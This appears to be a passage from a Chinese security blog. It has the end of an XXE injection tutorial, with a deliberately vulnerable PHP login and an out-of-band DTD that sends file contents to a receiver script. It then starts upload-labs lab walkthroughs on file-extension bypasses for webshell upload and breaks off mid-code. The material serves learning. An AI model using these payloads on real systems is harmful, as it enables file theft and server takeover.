<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$USERNAME = <span class="string">'admin'</span>; <span class="comment">//账号</span></span><br><span class="line">$PASSWORD = <span class="string">'admin'</span>; <span class="comment">//密码</span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($username == $USERNAME &amp;&amp; $password == $PASSWORD) &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">1</span>, $username);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">0</span>, $username);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">3</span>, $e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>

<h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><p>&emsp;&emsp;先正常登录一次，抓包</p>
<p><img src="https://i.loli.net/2019/08/11/aDtSVYlANCmpQnv.png" alt="image.png"></p>
<p>&emsp;&emsp;可以看到这里username和password是以xml文档的形式提交的，这段文档将会被simplexml_import_dom方法解析为dom。这个过程中因为load_XML设置了LIBXML_DTDLOAD和LIBXML_NOENT，所以可以加载解析外部实体，并且会回显username。我们改包试一下。</p>
<p><img src="https://i.loli.net/2019/08/11/v5MLWYQ368G2xK7.png" alt="image.png"></p>
<h3 id="非回显注入"><a href="#非回显注入" class="headerlink" title="非回显注入"></a>非回显注入</h3><p>payload:<br><img src="https://i.loli.net/2019/08/11/RgrH5uMoLDVkJws.png" alt="image.png"></p>
<p>eval.dtd:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1/2.php?file=%f1;'&gt;"&gt;</span><br></pre></td></tr></table></figure>

<p>2.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">file_put_contents(<span class="string">"2.txt"</span>, $file);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里要注意三个实体的解析顺序不能乱，读取的数据将被发送到2.php上。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><img src="https://i.loli.net/2019/08/11/IvB56z1deUDpym7.png" alt="image.png"><br>&emsp;&emsp;首先解析eval和f1实体，解析完后继续解析error实体，报文件不存在将f1内容回带。</p>
<h2 id="漏洞验证流程"><a href="#漏洞验证流程" class="headerlink" title="漏洞验证流程"></a>漏洞验证流程</h2><p>&emsp;&emsp;应当先验证实体是否能被解析，然后验证是否能加载外部实体，最后可以尝试是否能报错。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;总得来说，xxe的思路还是和sql注入有些类似，从回显的union注入到盲注，报错，结果外带，由于时间有限的缘故，只写了一文件包含的利用，不过对于入门来说，足够了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/08/11/xxe注入入门/" data-id="ck2jra66i0004fbtlvo3f1oiv" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xxe注入/">xxe注入</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/24/文件上传漏洞/" class="article-date">
  <time datetime="2019-06-24T05:43:31.000Z" itemprop="datePublished">2019-06-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/24/文件上传漏洞/">文件上传漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这段时间结合了upload-lab看了下文件上传漏洞，下面我想做一些总结</p>
<h2 id="文件上传漏洞的介绍"><a href="#文件上传漏洞的介绍" class="headerlink" title="文件上传漏洞的介绍"></a>文件上传漏洞的介绍</h2><p>&emsp;&emsp;文件上传漏洞是一种比较容易获得webshell的漏洞利用方式，多见于有图片上传功能的位置，通过上传一句话木马连接到服务器，以备后续操作。</p>
<h2 id="检验文件上传漏洞的一些思路"><a href="#检验文件上传漏洞的一些思路" class="headerlink" title="检验文件上传漏洞的一些思路"></a>检验文件上传漏洞的一些思路</h2><ol>
<li><p>客户端校验 禁用或修改js或者不用浏览器上传即可</p>
</li>
<li><p>服务端校验</p>
<ul>
<li>黑名单<ul>
<li>尝试上传.htaccess 添加AddType 将合法后缀名解析为php等</li>
<li>尝试使用等效后缀名 例如php替换为php3,php5等等<ul>
<li>php: php5,php4,php3,php2,html,htm,phtml,pht,pHp,pHp5,pHp4,pHp3,pHp2,Html,Htm,pHtml</li>
<li>asp: asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</li>
<li>jsp: jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</li>
</ul>
</li>
<li>利用操作系统特性例如win下，后缀名不予许有.,空格，::$DATA等等</li>
<li>利用服务器解析特性</li>
<li>双后缀名绕过</li>
</ul>
</li>
<li>白名单<ul>
<li>Content-type校验</li>
<li>%00截断和0x00截断</li>
<li>move_uploaded_file函数忽略/.</li>
</ul>
</li>
</ul>
<ol start="3">
<li>内容校验<ul>
<li>文件开始的内容校验<ul>
<li>JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00）</li>
<li>gif，”GIF89A”（474946383961）</li>
<li>zip，”ZipCompressed”（504B0304）</li>
<li>doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE1)</li>
</ul>
</li>
<li>一次渲染</li>
<li>二次渲染</li>
</ul>
</li>
</ol>
</li>
<li><p>逻辑 主要是竞争上传</p>
</li>
</ol>
<h2 id="upload-labs-部分实例"><a href="#upload-labs-部分实例" class="headerlink" title="upload-labs 部分实例"></a>upload-labs 部分实例</h2><h3 id="pass-1-2"><a href="#pass-1-2" class="headerlink" title="pass 1-2"></a>pass 1-2</h3><p>&emsp;&emsp;js校验和content type校验</p>
<h3 id="pass-3"><a href="#pass-3" class="headerlink" title="pass 3"></a>pass 3</h3><p>&emsp;&emsp; 等价后缀绕过<br>&emsp;&emsp; ​</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp; 显然可以用php5等后缀绕过</p>
<h3 id="pass-4-上传-htaccess"><a href="#pass-4-上传-htaccess" class="headerlink" title="pass 4 上传.htaccess"></a>pass 4 上传.htaccess</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,...);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br></pre></td></tr></table></figure>

<p> 没有过滤.htaccess ，上传.htaccess<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php  .jpg</span><br></pre></td></tr></table></figure></p>
<h3 id="pass-5"><a href="#pass-5" class="headerlink" title="pass 5"></a>pass 5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">"</span></span><br><span class="line"><span class="string">        .php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"</span></span><br><span class="line"><span class="string">        .html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,</span><br><span class="line">        <span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,</span><br><span class="line">        <span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,</span><br><span class="line">        <span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,</span><br><span class="line">        <span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,</span><br><span class="line">        <span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,</span><br><span class="line">        <span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,</span><br><span class="line">        <span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,</span><br><span class="line">        <span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,</span><br><span class="line">        <span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,</span><br><span class="line">        <span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,</span><br><span class="line">        <span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,</span><br><span class="line">        <span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,</span><br><span class="line">        <span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然没有过滤后缀名的大小写，尝试Php，可以得到phpinfo.Php<br>还有一种过waf的方法就是双写::$DATA，可以得到xxx.php</p>
<h3 id="pass-6"><a href="#pass-6" class="headerlink" title="pass 6"></a>pass 6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,</span><br><span class="line">        <span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,</span><br><span class="line">        <span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,</span><br><span class="line">        <span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,</span><br><span class="line">        <span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,</span><br><span class="line">        <span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,</span><br><span class="line">        <span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,</span><br><span class="line">        <span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,</span><br><span class="line">        <span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,</span><br><span class="line">        <span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,</span><br><span class="line">        <span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);</span><br><span class="line">        <span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计代码发现比起上一关的代码减少了对后缀名前后的空格的过滤，那么修改后缀名为phpinfo.php(空格) 即可</p>
<h3 id="pass-7"><a href="#pass-7" class="headerlink" title="pass 7"></a>pass 7</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较这一题的代码和上一题的代码主要有两个不通点，一个自然是过滤了空格，另外一个则是在拼接img_path时，$file_name并没有采取随机数重命名的方式而采用了原名，这样就给双后缀名绕过提供了机会。因为$file_ext是最后一个.开始到结束的字符串，而这题中原文件名并没有被处理，如果上一部分包含了.php等后缀名便可被解析。<br>尝试phpinfo.php.</p>
<p>这里还有一种方法就是利用apache的解析漏洞,如果文件后缀名apache无法解析,那么apache就会从已解析的后缀名往左解析例如phpinfo.php.xxx无法解析，那么apache便会解析.php，然而我试了下好像没有用。</p>
<p>另外一种方法就是00截断，这种方法我想待会一起讨论</p>
<h3 id="pass-8"><a href="#pass-8" class="headerlink" title="pass 8"></a>pass 8</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>显然这题没有过滤::$DATA，那么就用 ::$DATA绕过即可</p>
<h3 id="pass-9"><a href="#pass-9" class="headerlink" title="pass 9"></a>pass 9</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span 